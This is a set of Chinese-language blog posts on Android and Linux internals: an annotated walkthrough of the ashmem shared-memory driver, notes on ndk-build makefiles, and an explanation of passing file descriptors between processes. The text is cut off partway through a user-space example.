    <title>Android匿名共享内存(Anonymous Shared Memory) --- 瞎折腾记录 (驱动程序篇)</title>
    <url>/2019/03/12/blog_idx_081/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  无




背景
  没有买卖，就没有伤害。 ------  （佚名）
  作为一个打工仔，要积极完成领导分配的任务。so,我分配到一个关于android进程间高效传输大量数据的的任务。不用我说，只要提及“大量”“高效”“进程间”这几个词，首先就得想到共享内存。虽然共享内存有这样那样的缺点，但是有一个优点，那就是快。
  可是这里有个问题，为什么我需要去读这些驱动或者乱七八糟的东西？因为Android提供了一个java类叫做：MemoryFile就可以实现共享内存，MemoryFile是android基于其共享内存机制实现的java层到java层之间的数据传输。但是，在我们的工作内容中，需要在android系统中用前向框架跑深度学习算法，这里有个问题，我们跑算法的时候是在C or C层跑的，但是我们有一些图像数据需要在apk里面采集或者使用。在Android中，怎么让图像数据在c or c层和java层快速传输，c or c++ 层之间快速传输，这就需要我们了解android 共享内存机制，做出合适的抉择。




Android Anonymous Shared Memory 简介

  我们都知道Android是基于Linux内核搭建的一个分层系统，其中有kernel层，RunTimeLib和其他lib层，Framework层，Application层。虽然Linux os带了很多IPC的机制，其中Sharedmemory也有两种，但是在android系统里面，是没有这些内容的，android的linuxkernel你可以理解为是一种深度定制版，很多东西都与普通的linux kenel不一致。
  由于Androidkernel不带普通的linuxkernel的常用共享内存方式，所以android 系统提供了另外一种替代方式，当然不是全部重复造轮子，只是通过驱动程序的方式，增加了自己想要的新特性，并封装了一个新的共享内存接口出来。
  更详细和基本的介绍：请大家去参考百度的很多对Android共享内存的介绍。现在网上有很多关于android共享内存的介绍，有部分是精品，让我受益匪浅，是可以参考的。这里向这些无私奉献精品的前辈致敬。




Android Anonymous Shared Memory 驱动源码分析

  在我记忆中，有一个不知道谁说的，学习的好方法，那就是：从源码来，到源码去。我一直抱着这种心态来学习新的事物，毕竟许多理论是需要我们去了解，虽然不需要去重复造轮子。
  Android kernel的驱动编写和linuxkernel的驱动编写类似，都是有一个入口函数。我们首先从这两个函数开始分析，然后分析几个比较重要的接口就行。
  源码版本：android-p release kernel 4.9
  目录：\drivers\staging\android\ashmem.c
  驱动入口
/**
 * struct ashmem_area - The anonymous shared memory area
 * @name:		The optional name in /proc/pid/maps
 * @unpinned_list:	The list of all ashmem areas
 * @file:		The shmem-based backing file
 * @size:		The size of the mapping, in bytes
 * @prot_mask:		The allowed protection bits, as vm_flags
 *
 * The lifecycle of this structure is from our parent file's open() until
 * its release(). It is also protected by 'ashmem_mutex'
 *
 * Warning: Mappings do NOT pin this structure; It dies on close()
 */
struct ashmem_area &#123;
	char name[ASHMEM_FULL_NAME_LEN];
	struct list_head unpinned_list;
	struct file *file;
	size_t size;
	unsigned long prot_mask;
&#125;;

/**
 * struct ashmem_range - A range of unpinned/evictable pages
 * @lru:	         The entry in the LRU list
 * @unpinned:	         The entry in its area's unpinned list
 * @asma:	         The associated anonymous shared memory area.
 * @pgstart:	         The starting page (inclusive)
 * @pgend:	         The ending page (inclusive)
 * @purged:	         The purge status (ASHMEM_NOT or ASHMEM_WAS_PURGED)
 *
 * The lifecycle of this structure is from unpin to pin.
 * It is protected by 'ashmem_mutex'
 */
struct ashmem_range &#123;
	struct list_head lru;
	struct list_head unpinned;
	struct ashmem_area *asma;
	size_t pgstart;
	size_t pgend;
	unsigned int purged;
&#125;;

static const struct file_operations ashmem_fops = &#123;
	.owner = THIS_MODULE,
	.open = ashmem_open,
	.release = ashmem_release,
	.read = ashmem_read,
	.llseek = ashmem_llseek,
	.mmap = ashmem_mmap,
	.unlocked_ioctl = ashmem_ioctl,
#ifdef CONFIG_COMPAT
	.compat_ioctl = compat_ashmem_ioctl,
#endif
&#125;;


static struct miscdevice ashmem_misc = &#123;
	.minor = MISC_DYNAMIC_MINOR,
	.name = "ashmem",
	.fops = &amp;ashmem_fops,
&#125;;


static struct kmem_cache *ashmem_area_cachep __read_mostly;
static struct kmem_cache *ashmem_range_cachep __read_mostly;

static int __init ashmem_init(void)
&#123;
	int ret = -ENOMEM;
	//slab 缓存 中 创建struct ashmem_area内存区域结构，这个创建后，下一次分配这个结构体的时候可以更快。
	ashmem_area_cachep = kmem_cache_create("ashmem_area_cache",
					       sizeof(struct ashmem_area),
					       0, 0, NULL);
	////unlikely()--执行else后面的语句概率较高，增加cache命中率，likely()与此功能相反
	//
	if (unlikely(!ashmem_area_cachep)) &#123;
		pr_err("failed to create slab cache\n");
		goto out;
	&#125;
	//同上
	ashmem_range_cachep = kmem_cache_create("ashmem_range_cache",
						sizeof(struct ashmem_range),
						0, 0, NULL);
	if (unlikely(!ashmem_range_cachep)) &#123;
		pr_err("failed to create slab cache\n");
		goto out_free1;
	&#125;
	//杂项设备注册
	ret = misc_register(&amp;ashmem_misc);
	if (unlikely(ret)) &#123;
		pr_err("failed to register misc device!\n");
		goto out_free2;
	&#125;
	//这个好像和内存回收有关。我这里不关心。
	register_shrinker(&amp;ashmem_shrinker);

	pr_info("initialized\n");

	return 0;

out_free2:
	kmem_cache_destroy(ashmem_range_cachep);
out_free1:
	kmem_cache_destroy(ashmem_area_cachep);
out:
	return ret;
&#125;

device_initcall(ashmem_init);

  当这个设备创建以后，就会在/dev/下生成一个ashmem字符设备。
  在struct file_operations ashmem_fops中，我们注册了很多接口，如果大家对linux 驱动编程没有一点了解的话，你可以直接理解为我们在用户态调用open就会调用这里的ashmem_open，其他的类似。
  下面我们重点介绍几个我们常用的接口：ashmem_open，ashmem_ioctl，ashmem_mmap。
  ashmem_open
  我们调用open的时候，打开一个内存共享。
/**
 * ashmem_open() - Opens an Anonymous Shared Memory structure
 * @inode:	   The backing file's index node(?)
 * @file:	   The backing file
 *
 * Please note that the ashmem_area is not returned by this function - It is
 * instead written to "file->private_data".
 *
 * Return: 0 if successful, or another code if unsuccessful.
 */
static int ashmem_open(struct inode *inode, struct file *file)
&#123;
	struct ashmem_area *asma;
	int ret;
	
	//检查vfs打开的文件，在32为系统下打开大文件导致overflow的问题
	ret = generic_file_open(inode, file);
	////unlikely()--ret为0的概率较大，增加cache命中率，方便编译器优化分支语句。
	//（把else后的语句紧贴if之后，把return 放到jmp之后。）likely()与此功能相反
	//
	if (unlikely(ret))
		return ret;

	/*

	GFP_KERNEL —— 正常分配内存，可以被中断，还有其他内存分配标志。GFP_KERNEL，GFP_DMA

	*/
	//快速分配一个struct ashmem_area结构体，相当于这段新开辟的共享内存的句柄
	asma = kmem_cache_zalloc(ashmem_area_cachep, GFP_KERNEL);
	if (unlikely(!asma))
		return -ENOMEM;
	//这个和内存回收有关，不管
	INIT_LIST_HEAD(&amp;asma->unpinned_list);
	//给共享内存名字赋初值
	memcpy(asma->name, ASHMEM_NAME_PREFIX, ASHMEM_NAME_PREFIX_LEN);
	//设置保护位
	asma->prot_mask = PROT_MASK;
	//利用struct file结构体中的private_data 来保存我们刚刚分配的句柄的指针。private_data 可以用来携带个人定制的数据，这里用来携带我们定义的共享内存句柄。注意这个地方很重要，为啥重要后面独立解释。
	file->private_data = asma;

	return 0;
&#125;
  ashmem_ioctl
  这里我们关注一下，给struct ashmem_area 的name和size赋值即可，这里注意，还没有分配实际的内存，仅仅是句柄的相关信息填充完毕了。
static long ashmem_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
&#123;
	//这里就是获取之前ashmem_open的过程中，我们保存的共享内存句柄
	struct ashmem_area *asma = file->private_data;
	long ret = -ENOTTY;

	switch (cmd) &#123;
	case ASHMEM_SET_NAME:
		ret = set_name(asma, (void __user *)arg);
		break;
	case ASHMEM_GET_NAME:
		ret = get_name(asma, (void __user *)arg);
		break;
	case ASHMEM_SET_SIZE:
		ret = -EINVAL;
		mutex_lock(&amp;ashmem_mutex);
		if (!asma->file) &#123;
			ret = 0;
			asma->size = (size_t)arg;
		&#125;
		mutex_unlock(&amp;ashmem_mutex);
		break;
	case ASHMEM_GET_SIZE:
		ret = asma->size;
		break;
	case ASHMEM_SET_PROT_MASK:
		ret = set_prot_mask(asma, arg);
		break;
	case ASHMEM_GET_PROT_MASK:
		ret = asma->prot_mask;
		break;
	case ASHMEM_PIN:
	case ASHMEM_UNPIN:
	case ASHMEM_GET_PIN_STATUS:
		ret = ashmem_pin_unpin(asma, cmd, (void __user *)arg);
		break;
	case ASHMEM_PURGE_ALL_CACHES:
		ret = -EPERM;
		if (capable(CAP_SYS_ADMIN)) &#123;
			struct shrink_control sc = &#123;
				.gfp_mask = GFP_KERNEL,
				.nr_to_scan = LONG_MAX,
			&#125;;
			ret = ashmem_shrink_count(&amp;ashmem_shrinker, &amp;sc);
			ashmem_shrink_scan(&amp;ashmem_shrinker, &amp;sc);
		&#125;
		break;
	&#125;

	return ret;
&#125;
  ashmem_mmap
static int ashmem_mmap(struct file *file, struct vm_area_struct *vma)
&#123;
	//同上
	struct ashmem_area *asma = file->private_data;
	int ret = 0;

	mutex_lock(&amp;ashmem_mutex);

	/* user needs to SET_SIZE before mapping */
	if (unlikely(!asma->size)) &#123;
		ret = -EINVAL;
		goto out;
	&#125;

	/* requested mapping size larger than object size */
	if (vma->vm_end - vma->vm_start > PAGE_ALIGN(asma->size)) &#123;
		ret = -EINVAL;
		goto out;
	&#125;

	/* requested protection bits must match our allowed protection mask */
	if (unlikely((vma->vm_flags &amp; ~calc_vm_prot_bits(asma->prot_mask, 0)) &amp;
		     calc_vm_prot_bits(PROT_MASK, 0))) &#123;
		ret = -EPERM;
		goto out;
	&#125;
	vma->vm_flags &amp;= ~calc_vm_may_flags(~asma->prot_mask);

	//第一次mmap时，正式申请内存
	if (!asma->file) &#123;
		char *name = ASHMEM_NAME_DEF;
		struct file *vmfile;

		if (asma->name[ASHMEM_NAME_PREFIX_LEN] != '\0')
			name = asma->name;

		/* ... and allocate the backing shmem file */

		/**
		 * shmem_kernel_file_setup - get an unlinked file living in tmpfs which must be
		 *	kernel internal.  There will be NO LSM permission checks against the
		 *	underlying inode.  So users of this interface must do LSM checks at a
		 *	higher layer.  The users are the big_key and shm implementations.  LSM
		 *	checks are provided at the key or shm level rather than the inode.
		 * @name: name for dentry (to be seen in /proc/&lt;pid>/maps
		 * @size: size to be set for the file
		 * @flags: VM_NORESERVE suppresses pre-accounting of the entire object size
		 */
		//在tmpfs中创建一个文件，并创建一个inode指向这个文件，并把inode和struct file的返回值关联起来。这个文件就是我们实际的共享的内存文件。这里我们看到其实android 匿名共享内存也是基于linux 普通的共享内存底层来实现的，不重复造轮子。
		vmfile = shmem_file_setup(name, asma->size, vma->vm_flags);
		if (IS_ERR(vmfile)) &#123;
			ret = PTR_ERR(vmfile);
			goto out;
		&#125;
		vmfile->f_mode |= FMODE_LSEEK;
		//用file域保存我们在tmpfs中创建的共享内存文件的file结构指针。也就是说现在开始，asma->file指向了我们的共享内存文件。
		asma->file = vmfile;
	&#125;
	
	get_file(asma->file);

	//把asma->file和我们mmap 的内存区域中的vma->vm_file关联起来。这样访问mmap的这段内存区域就等于访问我们创建的这个共享内存文件。
	if (vma->vm_flags &amp; VM_SHARED)
		shmem_set_file(vma, asma->file);
	else &#123;
		if (vma->vm_file)
			fput(vma->vm_file);
		vma->vm_file = asma->file;
	&#125;

out:
	mutex_unlock(&amp;ashmem_mutex);
	return ret;
&#125;




Android Anonymous Shared Memory 驱动使用

  Android 官方的一个lib用例库中，封装了一部分共享内存的用法，这部分内容就是给MemoryFile的Native层的库使用的。下面我们一起来分析分析。
  Android O r4
  system/core/libcutils/ashmem-dev.c
/*
 * Copyright (C) 2008 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/*
 * Implementation of the user-space ashmem API for devices, which have our
 * ashmem-enabled kernel. See ashmem-sim.c for the "fake" tmp-based version,
 * used by the simulator.
 */
#define LOG_TAG "ashmem"

#include &lt;errno.h>
#include &lt;fcntl.h>
#include &lt;linux/ashmem.h>
#include &lt;pthread.h>
#include &lt;string.h>
#include &lt;sys/ioctl.h>
#include &lt;sys/stat.h>
#include &lt;sys/types.h>
#include &lt;unistd.h>

#include &lt;cutils/ashmem.h>
#include &lt;log/log.h>

#define ASHMEM_DEVICE "/dev/ashmem"

/* ashmem identity */
static dev_t __ashmem_rdev;
/*
 * If we trigger a signal handler in the middle of locked activity and the
 * signal handler calls ashmem, we could get into a deadlock state.
 */
static pthread_mutex_t __ashmem_lock = PTHREAD_MUTEX_INITIALIZER;

/* logistics of getting file descriptor for ashmem */
static int __ashmem_open_locked()
&#123;
    int ret;
    struct stat st;
	//这里打开了"/dev/ashmem"驱动设备，创建了一个共享内存文件，返回了这个共享文件的文件描述符
    int fd = TEMP_FAILURE_RETRY(open(ASHMEM_DEVICE, O_RDWR));
    if (fd &lt; 0) &#123;
        return fd;
    &#125;

    ret = TEMP_FAILURE_RETRY(fstat(fd, &amp;st));
    if (ret &lt; 0) &#123;
        int save_errno = errno;
        close(fd);
        errno = save_errno;
        return ret;
    &#125;
    if (!S_ISCHR(st.st_mode) || !st.st_rdev) &#123;
        close(fd);
        errno = ENOTTY;
        return -1;
    &#125;

    __ashmem_rdev = st.st_rdev;
    return fd;
&#125;

static int __ashmem_open()
&#123;
    int fd;

    pthread_mutex_lock(&amp;__ashmem_lock);
    fd = __ashmem_open_locked();
    pthread_mutex_unlock(&amp;__ashmem_lock);

    return fd;
&#125;

/* Make sure file descriptor references ashmem, negative number means false */
static int __ashmem_is_ashmem(int fd, int fatal)
&#123;
    dev_t rdev;
    struct stat st;

    if (TEMP_FAILURE_RETRY(fstat(fd, &amp;st)) &lt; 0) &#123;
        return -1;
    &#125;

    rdev = 0; /* Too much complexity to sniff __ashmem_rdev */
    if (S_ISCHR(st.st_mode) &amp;&amp; st.st_rdev) &#123;
        pthread_mutex_lock(&amp;__ashmem_lock);
        rdev = __ashmem_rdev;
        if (rdev) &#123;
            pthread_mutex_unlock(&amp;__ashmem_lock);
        &#125; else &#123;
            int fd = __ashmem_open_locked();
            if (fd &lt; 0) &#123;
                pthread_mutex_unlock(&amp;__ashmem_lock);
                return -1;
            &#125;
            rdev = __ashmem_rdev;
            pthread_mutex_unlock(&amp;__ashmem_lock);

            close(fd);
        &#125;

        if (st.st_rdev == rdev) &#123;
            return 0;
        &#125;
    &#125;

    if (fatal) &#123;
        if (rdev) &#123;
            LOG_ALWAYS_FATAL("illegal fd=%d mode=0%o rdev=%d:%d expected 0%o %d:%d",
              fd, st.st_mode, major(st.st_rdev), minor(st.st_rdev),
              S_IFCHR | S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IRGRP,
              major(rdev), minor(rdev));
        &#125; else &#123;
            LOG_ALWAYS_FATAL("illegal fd=%d mode=0%o rdev=%d:%d expected 0%o",
              fd, st.st_mode, major(st.st_rdev), minor(st.st_rdev),
              S_IFCHR | S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IRGRP);
        &#125;
        /* NOTREACHED */
    &#125;

    errno = ENOTTY;
    return -1;
&#125;

int ashmem_valid(int fd)
&#123;
    return __ashmem_is_ashmem(fd, 0) >= 0;
&#125;

/*
 * ashmem_create_region - creates a new ashmem region and returns the file
 * descriptor, or &lt;0 on error
 *
 * `name' is an optional label to give the region (visible in /proc/pid/maps)
 * `size' is the size of the region, in page-aligned bytes
 */
 //实际我们要创建的共享内存方法就是这个，其实就是打开设备，然后设置name和size，最终通过mmap把这个fd映射到我们的进程空间，然后我们的程序就可以访问了。
int ashmem_create_region(const char *name, size_t size)
&#123;
    int ret, save_errno;

    int fd = __ashmem_open();
    if (fd &lt; 0) &#123;
        return fd;
    &#125;

    if (name) &#123;
        char buf[ASHMEM_NAME_LEN] = &#123;0&#125;;

        strlcpy(buf, name, sizeof(buf));
        ret = TEMP_FAILURE_RETRY(ioctl(fd, ASHMEM_SET_NAME, buf));
        if (ret &lt; 0) &#123;
            goto error;
        &#125;
    &#125;

    ret = TEMP_FAILURE_RETRY(ioctl(fd, ASHMEM_SET_SIZE, size));
    if (ret &lt; 0) &#123;
        goto error;
    &#125;

    return fd;

error:
    save_errno = errno;
    close(fd);
    errno = save_errno;
    return ret;
&#125;

int ashmem_set_prot_region(int fd, int prot)
&#123;
    int ret = __ashmem_is_ashmem(fd, 1);
    if (ret &lt; 0) &#123;
        return ret;
    &#125;

    return TEMP_FAILURE_RETRY(ioctl(fd, ASHMEM_SET_PROT_MASK, prot));
&#125;

int ashmem_pin_region(int fd, size_t offset, size_t len)
&#123;
    struct ashmem_pin pin = &#123; offset, len &#125;;

    int ret = __ashmem_is_ashmem(fd, 1);
    if (ret &lt; 0) &#123;
        return ret;
    &#125;

    return TEMP_FAILURE_RETRY(ioctl(fd, ASHMEM_PIN, &amp;pin));
&#125;

int ashmem_unpin_region(int fd, size_t offset, size_t len)
&#123;
    struct ashmem_pin pin = &#123; offset, len &#125;;

    int ret = __ashmem_is_ashmem(fd, 1);
    if (ret &lt; 0) &#123;
        return ret;
    &#125;

    return TEMP_FAILURE_RETRY(ioctl(fd, ASHMEM_UNPIN, &amp;pin));
&#125;

int ashmem_get_size_region(int fd)
&#123;
    int ret = __ashmem_is_ashmem(fd, 1);
    if (ret &lt; 0) &#123;
        return ret;
    &#125;

    return TEMP_FAILURE_RETRY(ioctl(fd, ASHMEM_GET_SIZE, NULL));
&#125;
  同时，在MemoryFile的jni接口中，我们可以发现直接调用ashmem_create_region，创建了一块共享内存区域。
static jobject SharedMemory_create(JNIEnv* env, jobject, jstring jname, jint size) &#123;

    // Name is optional so we can't use ScopedUtfChars for this as it throws NPE on null
    const char* name = jname ? env->GetStringUTFChars(jname, nullptr) : nullptr;

    int fd = ashmem_create_region(name, size);

    // Capture the error, if there is one, before calling ReleaseStringUTFChars
    int err = fd &lt; 0 ? errno : 0;

    if (name) &#123;
        env->ReleaseStringUTFChars(jname, name);
    &#125;

    if (fd &lt; 0) &#123;
        throwErrnoException(env, "SharedMemory_create", err);
        return nullptr;
    &#125;

    return jniCreateFileDescriptor(env, fd);
&#125;




后记

  总结
  这里我们看到，共享内存的创建原理。但是这里有个问题没有解释清楚，那就是内存是怎么共享的？
  在本文中，我们可以知道我们的创建共享内存的进程可以得到一个共享内存文件的文件描述符，其他的进程怎么知道这块内存在那里呢？这里我明确说明，android还要靠共享共享内存文件文件描述符来实现共享内存，但是一个文件描述符只对当前进程有效，其他进程的同一个值的文件描述符可能指向不同的文件，所以得有一种可靠的方式来实现文件描述符的传递即可。
  预知后事如何，请听下回分解！！
2019/3/18更新
  本来是一系列的文章，但是后续篇整理后，发现不能成为一个系列了。所以这里留个传送门：《linux kernel 中进程间描述符的传递方法及原理》：https://blog.csdn.net/u011728480/article/details/88553602
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>Android</category>
        <category>linux开发</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>Android匿名共享内存</tag>
      </tags>
  </entry>
  <entry>
    <title>android ndk生成第三方库的so方法(ndk-build，Application.mk，Android.mk)</title>
    <url>/2019/02/14/blog_idx_080/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  本文适合至少知道makefile，jni，ndk，gcc基本编译知识是什么鬼东西的人阅读。




背景

  以前，关于android中使用jni相关的东西的时候(jni头文件生成，jni的so文件的生成)，我太依赖与as工具了。导致了，什么都需要ide来完成，平常这么用的时候，其实是没有什么毛病的。但是比如说你要发布一个自己封装的库时候，自己在ide上配置然后编译其实是没有什么问题的，但是你把as工程发给别人的时候，总会遇到这样那样的问题，很烦。于是想着把生成android app使用的so独立出来，方便我们查找错误，同时也加深了自己对于android ndk的理解。




NDK

  ndk 是android提供的原生开发包。它可以让android app可以利用c和c的库等等。在我们安装的android sdk中，其实是就包含了ndk的内容，可以说ndk 部分内容是android系统可以正常运行的基石,因为在android 系统中，很多内容不适合使用java来开发，所以只能通过java调用c和c的方式来实现相应的内容。
  本文也是按照android开发者网站的ndk相关文档进行学习总结，同时也贴出一些基本错误方便排查。(https://developer.android.google.cn/ndk/guides/)




ndk-build 脚本

  按照官方文档的说法：ndk-build 这个脚本在ndk r4的时候就存在了。它的主要作用就是初始化很多内容，然后执行gnu-make 来编译ndk部分的源码。
  其核心执行的命令官网也给出来了：
GNUMAKE -f &lt;ndk>/build/core/build-local.mk &lt;parameters>
  这里我们其实也知道了，要成功使用这个脚本必须安装gnu-make （还必须是3.81级以上的版本）




Android.mk文件

  首先我们要明白，Android.mk只是一个makefile片段，这个片段中定义相关变量，然后被make命令使用和解析，我们只需要按照别人规定好的方法填写相应变量的值即可。
  这里我主要使用了最基本的一些变量,同时提供相应的注释解释，如果要查看完整说明，请参考https://developer.android.google.cn/ndk/guides/中android.mk部分内容，实例如下：
LOCAL_PATH := $(call my-dir)
#这个LOCAL_PATH变量存储的是当前文件所在目录，是通过调用my-dir这个函数实现的

include $(CLEAR_VARS)
#CLEAR_VARS是一个特殊的makefile文件，其中清空了许多变量的值

LOCAL_MODULE := android-shmem
#LOCAL_MODULE填写的是你要生成的so的库名字的核心部分，这里生成的库名字为：libandroid-shmem.so

LOCAL_SRC_FILES := shmem.c
#LOCAL_SRC_FILES填写你要编译到so的源文件名字

include $(BUILD_SHARED_LIBRARY)
#BUILD_SHARED_LIBRARY指向一个特殊的makefile文件，将会收集以上的变量信息，然后生成动态库。




Application.mk文件

  这个文件也是一个makefile文件，
  我这里也列出一个实例来说明：
APP_CFLAGS += -std=c99
#做或者c++编程的都应该知道编译器编译参数设置
APP_CPPFLAGS +=
#做或者c++编程的都应该知道编译器编译参数设置
APP_LDFLAGS += -llog
#做或者c++编程的都应该知道编译器链接参数设置，这里是填写依赖了哪些动态库
APP_STL +=
#生成 对应 某一运行时库的动态库文件

APP_PIE = true
# 生成位置独立的代码，

APP_ABI = armeabi-v7a
#这个变量我们会经常遇到，主要是指定app或者说so运行的cpu指令集。

APP_PLATFORM = android-21
#这个对应的android版本号
  这里的APP_ABI的内容对于我们来说特别重要，我这里把官网的内容搬过来了：
基于 ARMv5TE的设备硬件（采用软件浮点运算）：APP_ABI := armeabi（兼容性最好，浮点运算性能差劲）
基于 ARMv7 的设备上的硬件 FPU 指令	APP_ABI := armeabi-v7a
ARMv8 AArch64	APP_ABI := arm64-v8a
IA-32	APP_ABI := x86
Intel64	APP_ABI := x86_64
MIPS32	APP_ABI := mips
MIPS64 (r6)	APP_ABI := mips64
所有支持的指令集	APP_ABI := all




使用实例

  如果直接运行ndk-build会报如下错误：


Android NDK: Could not find application project directory !


Android NDK: Please define the NDK_PROJECT_PATH variable to point to it.


  提示我们有个变量没有设置，我们设置上，后续还会提示其他的问题，我们一并设置，
ndk-build NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk NDK_APPLICATION_MK=./Application.mk


NDK_PROJECT_PATH 对应项目路径


APP_BUILD_SCRIPT 对应Android.mk路径，这个变量有默认值，具体参考官网。


NDK_APPLICATION_MK 对应Applicaiton.mk路径


  结果：

    
        
    
    




后记

  总结
  文中只是介绍了非常基础的内容，如果需要一些骚操作，可能就会用到一些其他变量，对于这些内容，请参考文中提到的android开发者官网。
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>jni</tag>
        <tag>ndk</tag>
      </tags>
  </entry>
  <entry>
    <title>linux kernel 中进程间描述符的传递方法及原理</title>
    <url>/2019/03/18/blog_idx_082/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  无




背景
  为啥我会去找这方面的资料总结？因为我写了一篇另外的文章:《Android匿名共享内存(Anonymous Shared Memory) — 瞎折腾记录 (驱动程序篇)》(https://blog.csdn.net/u011728480/article/details/88420467)，写着写着到了最后，其技术核心就是描述符的进程间传递，导致了我必须得去了解这方面的大致原理。
  本文也是作为那篇文章的后续补充吧。




技术大致原理

  这里为啥要用“大致”一词，因为还有另外一种比较特殊的传递描述符的方法，文后将会详细说明。
  描述符 定义大致可以描述为：一个进程空间中，用一个正整数来代表一个已经被此进程打开的文件，我们可以根据这个正整数来操作这个打开文件。从这里我们可以知道，这个正整数是属于这个进程的，换句话说：不同的进程打开同一个文件的描述符是可能一样的值。
  此外这里有一个关于linux 虚拟文件系统的知识需要我们知道，一个是struct node 一个是struct file。在内核中，维护了一个所有打开文件的struct file表，这个代表着这个文件当前的操作状态等等。这个struct file指向了struct node，struct node 代表的是实际数据在存储介质上的哪个位置。换句简单的话来说就是：A和B两个进程打开了同一个文件，那么内核中就会存在一个struct file的变量指向这个打开的文件，对于AB两个进程来说，都会得到一个值可能不一致的描述符，但是这两个不同的描述符指向了内核中保存的同一个struct file变量。
  经过上面的说明，我们可以知道的是，至少传递描述符的其中一种原理就是根据当前进程fd找到内核中的struct file，然后在目标进程中申请一个未使用的描述符，然后把这个申请的描述符和这个struct file 关联起来即可。




基于kernel内核态的描述符传输

  在上面的原理分析中，其中根据当前进程的描述符得到当前的已经打开文件的struct file 变量，以及其他操作，这些手段都只能够在内核态实现。所以合理的方案是开发一个linux 驱动(android里面就是通过binder驱动)，让这个描述符的传递通过一个驱动来完成。这样就可以利用内核态的相关接口来完成我们的事情。下面通过示例的源码来分析一波：


通过fd获取struct file 变量
  这里我在网上查到的有两种方案（肯定还有其他方案，因为工作在内核态）：一是通过运行进程的pid和fd。二是通过内核态的文件系统提供的fget（struct file *fget(unsigned int fd)）
  第一种方案：
  进程有一个进程控制块，进程控制块中放着一个当前进程打开的描述符表，这个表指向了具体的struct file。
  linux kernel ： kernel/pid.c
/*
通过以下接口：用pid得到struct pid 
*/
struct pid *find_get_pid(pid_t nr)
&#123;
	struct pid *pid;

	rcu_read_lock();
	pid = get_pid(find_vpid(nr));
	rcu_read_unlock();

	return pid;
&#125;
/*
通过以下接口，得到进程的控制块：struct task_struct.  (PIDTYPE_PID)
*/
struct task_struct *pid_task(struct pid *pid, enum pid_type type)
&#123;
	struct task_struct *result = NULL;
	if (pid) &#123;
		struct hlist_node *first;
		first = rcu_dereference_check(hlist_first_rcu(&amp;pid->tasks[type]),
					      lockdep_tasklist_lock_is_held());
		if (first)
			result = hlist_entry(first, struct task_struct, pids[(type)].node);
	&#125;
	return result;
&#125;

//struct task_struct的files域指向一个struct files_struct结构体。
//struct files_struct的fdt域指向了一个struct fdtable。
//struct fdtable的fd域指向了一个已经打开的struct file 数组，通过当前描述符来作为索引。
int cur_pid;
int cur_fd;

struct pid * tmp_pid = find_get_pid(cur_pid);
struct task_struct * cur_task = pid_task(tmp_pid , PIDTYPE_PID);
struct files_struct * cur_file_struct = cur_task->files;
struct file * cur_file = cur_file_struct->fdt->fd[cur_fd];

  第二种方案：
  内核态的文件系统提供了一个更简洁的方案：
  linuxkernel: fs/file.c
struct file *fget(unsigned int fd)
&#123;
	return __fget(fd, FMODE_PATH);
&#125;


给目标进程获取一个未使用的描述符
  linuxkernel:fs/open.c或者fs/file.c（我这里有两个内核，linux kernel和android kernel），位置不一致是kernel版本不一致，了解一下就行了。
int get_unused_fd_flags(unsigned flags)
&#123;
	return __alloc_fd(current->files, 0, rlimit(RLIMIT_NOFILE), flags);
&#125;


把我们获取的未使用的描述符和我们获取的struct file 关联起来
  linuxkernel:fs/open.c或者fs/file.c（我这里有两个内核，linux kernel和android kernel），位置不一致是kernel版本不一致，了解一下就行了。
void fastcall fd_install(unsigned int fd, struct file * file)
&#123;
	struct files_struct *files = current->files;
	struct fdtable *fdt;
	spin_lock(&amp;files->file_lock);
	fdt = files_fdtable(files);
	BUG_ON(fdt->fd[fd] != NULL);
	rcu_assign_pointer(fdt->fd[fd], file);
	spin_unlock(&amp;files->file_lock);
&#125;




基于用户态的描述符传输

  这个是在AUPE中发现的。貌似以前设计内核的人就预留了这个功能，利用unix的本地socket的一个特殊功能即可。这里用到的调用是以下两个：
  就是建立一个本地socket(AF_LOCAL,AF_UNIX)，然后通过以下两个接口的特殊功能即可完成描述符的特殊转换。这里我不做过多介绍，有兴趣的看文后的实例。
ssize_t sendmsg(int sockfd, const struct msghdr *msg, int flags);
ssize_t recvmsg(int sockfd, struct msghdr *msg, int flags);




实例分析



用户态实例
  userspace_way1_send.c
#include &lt;stdio.h>
#include &lt;sys/un.h>
#include &lt;sys/types.h>          /* See NOTES */
#include &lt;sys/socket.h>
#include &lt;unistd.h>
#include &lt;sys/types.h>
#include &lt;sys/stat.h>
#include &lt;fcntl.h>
#include &lt;string.h>


int main(int argc, char * argv[])&#123;

	struct sockaddr_un addr, addr1;

	int fd;
	if ( 0 > (fd = socket(AF_LOCAL, SOCK_STREAM, 0)) )&#123;

		perror("socket()");
		return -1;
	&#125;
	unlink("tmp.tmp");

	bzero(&amp;addr, sizeof(struct sockaddr_un));
